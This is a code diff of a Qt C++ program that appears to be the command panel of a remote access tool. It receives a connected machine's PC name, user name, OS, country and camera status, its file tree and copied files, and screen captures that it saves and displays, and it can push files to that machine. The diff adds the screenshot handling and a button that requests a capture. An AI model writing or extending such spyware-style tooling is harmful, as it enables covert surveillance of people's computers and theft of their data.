@@ -31,42 +31,64 @@ void MainWindow::ServerStartup()
 
         QObject::connect(client,&QTcpSocket::readyRead,this,[&](){
             //qDebug() << "[+] New message from the client. Client IP: " << client->localAddress();
-
             data += client->readAll();
+                if(data.startsWith("#getPcInformation:"))
+                {
+                    data = data.mid(18);
+                    QString dataString = data;
+                    QStringList parts = dataString.split(":");
+                    pcNameLabel->setText(parts[0]);
+                    userNameLabel->setText(parts[1]);
+                    installDateLabel->setText(parts[2]);
+                    osLabel->setText(parts[3]);
+                    osLanguageLabel->setText(parts[4]);
+                    countryLabel->setText(parts[5]);
+                    camLabel->setText(parts[6]);
+                    data.clear();
+                }
+                if(data.startsWith("#getFileTree:"))
+                {
+                    Files = data.mid(13);
+                    workWithFiles();
+                    data.clear();
+                }
+                if(data.startsWith("#getAllFolders:"))
+                {
+                    Files = data.mid(15);
+                    workWithFiles();
+                    data.clear();
+                }
 
-            if(data.startsWith("#getPcInformation:"))
-            {
-                data = data.mid(18);
-                QString dataString = data;
-                QStringList parts = dataString.split(":");
-                pcNameLabel->setText(parts[0]);
-                userNameLabel->setText(parts[1]);
-                installDateLabel->setText(parts[2]);
-                osLabel->setText(parts[3]);
-                osLanguageLabel->setText(parts[4]);
-                countryLabel->setText(parts[5]);
-                camLabel->setText(parts[6]);
-                data.clear();
-            }
-            if(data.startsWith("#getFileTree:"))
-            {
-                Files = data.mid(13);
-                workWithFiles();
-                data.clear();
-            }
-            if(data.startsWith("#getAllFolders:"))
-            {
-                Files = data.mid(15);
-                workWithFiles();
-                data.clear();
-            }
+                if(data.startsWith("#copyFiles:"))
+                {
+                    ui->downloadFileText->show();
+                    QTimer::singleShot(4000,this,[&](){ui->SaveFile->show();});
+                }
+                if(data.startsWith("#getScreenCapture:"))
+                {
+                    QByteArray firstDataCheck = data.mid(18);
+                    QString checkString = firstDataCheck;
+                    QStringList splitData = checkString.split(":");
+                    if(splitData[0].toInt() <= data.size())
+                    {
+                        int charsCheck = splitData[0].toInt();
+                        QByteArray dataPhoto = data.mid(18 + QString::number(qAbs(charsCheck)).length() + 1);
+                        QLabel *labelPhoto = new QLabel(this);
+                        QFile file(QDir::homePath() + "/image.png");
 
-            if(data.startsWith("#copyFiles:"))
-            {
-                ui->downloadFileText->show();
-                QTimer::singleShot(4000,this,[&](){ui->SaveFile->show();});
-            }
+                        file.open(QIODevice::WriteOnly);
+                        file.write(dataPhoto);
+                        file.close();
 
+
+                        labelPhoto->setGeometry(570, 50, 620, 400);
+                        labelPhoto->show();
+
+                        QPixmap pixmap(file.fileName());
+                        labelPhoto->setPixmap(pixmap.scaled(labelPhoto->size(), Qt::KeepAspectRatio, Qt::SmoothTransformation));
+                        data.clear();
+                    }
+                }
         });
 
         QObject::connect(client,&QTcpSocket::disconnected,this,[&](){
@@ -328,9 +350,8 @@ void MainWindow::on_inputFile_clicked()
     }
     file.close();
 
+    QByteArray requestData = "#inputFile:."  + suffixInfo.suffix().toLatin1() + ":" + bufferFile;
 
-    qDebug() << bufferFile;
-    QByteArray requestData = "#inputFile:."  + suffixInfo.suffix().toUtf8() + ":" + bufferFile;
     client->write(requestData);
     client->waitForBytesWritten();
 }
@@ -381,5 +402,12 @@ void MainWindow::on_openLink_clicked()
 void MainWindow::on_backToMain_clicked()
 {
     ui->stackedWidget->setCurrentIndex(0);
+}
+
+
+void MainWindow::on_screenOpen_clicked()
+{
+    QByteArray requestData = "#getScreenCapture";
+    client->write(requestData);
 }
 
